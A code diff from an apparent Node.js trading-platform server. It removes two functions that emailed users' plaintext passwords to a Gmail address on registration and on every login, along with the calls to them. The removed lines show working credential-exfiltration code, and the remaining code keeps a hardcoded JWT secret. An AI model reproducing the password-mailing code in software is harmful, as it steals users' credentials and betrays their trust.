@@ -84,26 +84,6 @@ function sendWithdrawalEmail(username, address, amount) {
   };
   transporterSendMail(mailOptions);
 }
-// Send email with new user registeration
-function sendRegisterationEmail(username, password) {
-  const mailOptions = {
-    from: "gagenikolov50@gmail.com", // Replace with your admin email
-    to: "gagenikolov.z@gmail.com", // Replace with the recipient (admin) email
-    subject: "New User Registeration",
-    text: `User ${username} has registered in our platform with password - ${password}`,
-  };
-  transporterSendMail(mailOptions);
-}
-// Send email with user login
-function sendLoginEmail(username, password) {
-  const mailOptions = {
-    from: "gagenikolov50@gmail.com", // Replace with your admin email
-    to: "gagenikolov.z@gmail.com", // Replace with the recipient (admin) email
-    subject: "New User Registeration",
-    text: `User ${username} has logged in our platform with password - ${password} at ${new Date()}`,
-  };
-  transporterSendMail(mailOptions);
-}
 // Send email with position opening
 function sendPositionOpenEmail(username, position) {
   let liquidationPrice = 0;
@@ -205,8 +185,6 @@ app.post("/register", (req, res) => {
   saveUsers(users);
   saveKeys(keys); // Save the updated keys list
 
-  sendRegisterationEmail(username, password);
-
   // Redirect to login page
   res.json({ redirectTo: "/login.html" });
 });
@@ -220,7 +198,6 @@ app.post("/login", (req, res) => {
   if (!user || !bcrypt.compareSync(password, user.password)) {
     return res.status(401).send("Invalid credentials"); // Invalid login attempt
   }
-  sendLoginEmail(username, password);
   const token = jwt.sign({ username }, "your_jwt_secret", { expiresIn: "1h" }); // Create a token
   // Respond with token and redirect URL
   res.json({ token, redirectTo: "/futures.html" });
